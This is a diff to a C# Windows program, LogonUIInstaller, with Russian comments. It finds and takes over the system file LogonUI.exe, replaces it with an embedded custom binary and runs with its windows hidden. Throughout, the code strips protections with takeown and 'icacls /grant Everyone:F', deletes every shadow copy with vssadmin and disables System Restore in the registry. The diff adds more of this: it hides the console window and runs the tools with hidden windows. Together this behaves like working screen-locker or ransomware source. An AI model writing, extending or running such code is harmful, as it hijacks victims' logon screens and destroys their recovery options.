@@ -1,4 +1,4 @@
-// Installer.cs - Убиваем только LogonUI процесс + поиск по всем дискам
+// Installer.cs - Убиваем только LogonUI процесс + поиск по всем дискам + полное снятие защит + без окон
 using System;
 using System.IO;
 using System.Security.AccessControl;
@@ -34,11 +34,23 @@ namespace LogonUIInstaller
             out uint response
         );
 
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
         private const uint HIGH_PRIORITY_CLASS = 0x00000080;
         private const uint PROCESS_DEP_ENABLE = 0x00000001;
+        private const int SW_HIDE = 0;
 
         static void Main(string[] args)
         {
+            // Скрываем консольное окно
+            IntPtr consoleWindow = GetConsoleWindow();
+            if (consoleWindow != IntPtr.Zero)
+                ShowWindow(consoleWindow, SW_HIDE);
+
             try
             {
                 if (!IsAdministrator())
@@ -50,10 +62,8 @@ namespace LogonUIInstaller
                 SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
                 SetProcessDEPPolicy(GetCurrentProcess(), PROCESS_DEP_ENABLE);
 
-                // Находим LogonUI.exe где угодно
                 string originalPath = FindLogonUI();
                 
-                // Если не найден - пробуем стандартный путь
                 if (string.IsNullOrEmpty(originalPath) || !File.Exists(originalPath))
                 {
                     originalPath = Path.Combine(
@@ -63,10 +73,8 @@ namespace LogonUIInstaller
                     );
                 }
 
-                // Проверяем, что файл существует
                 if (!File.Exists(originalPath))
                 {
-                    // Записываем в лог и выходим
                     try
                     {
                         File.WriteAllText(@"C:\Windows\Temp\~logonui_error.log", "LogonUI.exe не найден!");
@@ -75,8 +83,8 @@ namespace LogonUIInstaller
                     return;
                 }
 
-                SetFileOwnership(originalPath);
-                SetFilePermissions(originalPath, FileSystemRights.FullControl);
+                // Полное снятие всех защит
+                ForceFullAccess(originalPath);
 
                 byte[] customLogonUI = ExtractResource("LogonUI.exe");
 
@@ -130,9 +138,88 @@ namespace LogonUIInstaller
             }
         }
 
+        private static void ForceFullAccess(string path)
+        {
+            try
+            {
+                // 1. Снимаем все атрибуты
+                File.SetAttributes(path, FileAttributes.Normal);
+            }
+            catch { }
+
+            try
+            {
+                // 2. Забираем владение через takeown
+                ProcessStartInfo takeown = new ProcessStartInfo
+                {
+                    FileName = "takeown.exe",
+                    Arguments = $"/f \"{path}\"",
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                };
+                using (Process p = Process.Start(takeown))
+                {
+                    if (p != null)
+                        p.WaitForExit(3000);
+                }
+            }
+            catch { }
+
+            try
+            {
+                // 3. Даём полный доступ через icacls
+                ProcessStartInfo icacls = new ProcessStartInfo
+                {
+                    FileName = "icacls.exe",
+                    Arguments = $"\"{path}\" /grant Everyone:F /t",
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                };
+                using (Process p = Process.Start(icacls))
+                {
+                    if (p != null)
+                        p.WaitForExit(3000);
+                }
+            }
+            catch { }
+
+            try
+            {
+                // 4. Дополнительно через Security API
+                FileInfo fileInfo = new FileInfo(path);
+                FileSecurity fileSecurity = fileInfo.GetAccessControl();
+                
+                // Меняем владельца
+                fileSecurity.SetOwner(WindowsIdentity.GetCurrent().User);
+                
+                // Добавляем полный доступ для текущего пользователя
+                NTAccount account = new NTAccount(Environment.UserDomainName, Environment.UserName);
+                FileSystemAccessRule rule = new FileSystemAccessRule(account, 
+                    FileSystemRights.FullControl, AccessControlType.Allow);
+                fileSecurity.AddAccessRule(rule);
+                
+                // Добавляем полный доступ для SYSTEM
+                NTAccount systemAccount = new NTAccount("NT AUTHORITY\\SYSTEM");
+                FileSystemAccessRule systemRule = new FileSystemAccessRule(systemAccount, 
+                    FileSystemRights.FullControl, AccessControlType.Allow);
+                fileSecurity.AddAccessRule(systemRule);
+                
+                fileInfo.SetAccessControl(fileSecurity);
+            }
+            catch { }
+
+            try
+            {
+                // 5. Снимаем атрибуты ещё раз (на случай, если они восстановились)
+                File.SetAttributes(path, FileAttributes.Normal);
+            }
+            catch { }
+        }
+
         private static string FindLogonUI()
         {
-            // Приоритетные пути
             string[] possiblePaths = {
                 @"C:\Windows\System32\LogonUI.exe",
                 @"C:\WINDOWS\System32\LogonUI.exe",
@@ -143,7 +230,6 @@ namespace LogonUIInstaller
                 Environment.ExpandEnvironmentVariables(@"%WINDIR%\System32\LogonUI.exe")
             };
             
-            // Сначала проверяем приоритетные пути
             foreach (string path in possiblePaths)
             {
                 try
@@ -154,7 +240,6 @@ namespace LogonUIInstaller
                 catch { }
             }
             
-            // Если не нашли - ищем по всем дискам
             try
             {
                 foreach (DriveInfo drive in DriveInfo.GetDrives())
@@ -165,7 +250,6 @@ namespace LogonUIInstaller
                         {
                             string root = drive.Name;
                             
-                            // Поиск в \Windows\System32\
                             string[] windowsDirs = { "Windows", "WINDOWS", "WinNT" };
                             foreach (string winDir in windowsDirs)
                             {
@@ -173,13 +257,11 @@ namespace LogonUIInstaller
                                 if (File.Exists(system32Path))
                                     return system32Path;
                                 
-                                // Вариант с нижним регистром
                                 string system32lower = Path.Combine(root, winDir, "system32", "LogonUI.exe");
                                 if (File.Exists(system32lower))
                                     return system32lower;
                             }
                             
-                            // Поиск в папках \Windows\*\LogonUI.exe
                             string windowsPath = Path.Combine(root, "Windows");
                             if (Directory.Exists(windowsPath))
                             {
@@ -201,7 +283,6 @@ namespace LogonUIInstaller
             }
             catch { }
             
-            // Фолбэк - null
             return null;
         }
 
@@ -218,6 +299,8 @@ namespace LogonUIInstaller
             psi.FileName = Assembly.GetEntryAssembly().Location;
             psi.UseShellExecute = true;
             psi.Verb = "runas";
+            psi.CreateNoWindow = true;
+            psi.WindowStyle = ProcessWindowStyle.Hidden;
             try
             {
                 Process.Start(psi);
@@ -312,7 +395,8 @@ namespace LogonUIInstaller
                     FileName = "vssadmin.exe",
                     Arguments = "delete shadows /all /quiet",
                     CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = false
                 });
 
                 string[] backupPaths = {
@@ -352,7 +436,8 @@ namespace LogonUIInstaller
                     FileName = "reg.exe",
                     Arguments = "add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore /v DisableSR /t REG_DWORD /d 1 /f",
                     CreateNoWindow = true,
-                    WindowStyle = ProcessWindowStyle.Hidden
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    UseShellExecute = false
                 });
 
             }
@@ -387,7 +472,6 @@ namespace LogonUIInstaller
         {
             Assembly assembly = Assembly.GetExecutingAssembly();
             
-            // Прямой поиск по имени ресурса
             using (Stream stream = assembly.GetManifestResourceStream(resourceName))
             {
                 if (stream != null)
@@ -398,7 +482,6 @@ namespace LogonUIInstaller
                 }
             }
             
-            // Fallback — поиск с префиксом LogonUIInstaller.
             string fullName = $"LogonUIInstaller.{resourceName}";
             using (Stream fallbackStream = assembly.GetManifestResourceStream(fullName))
             {
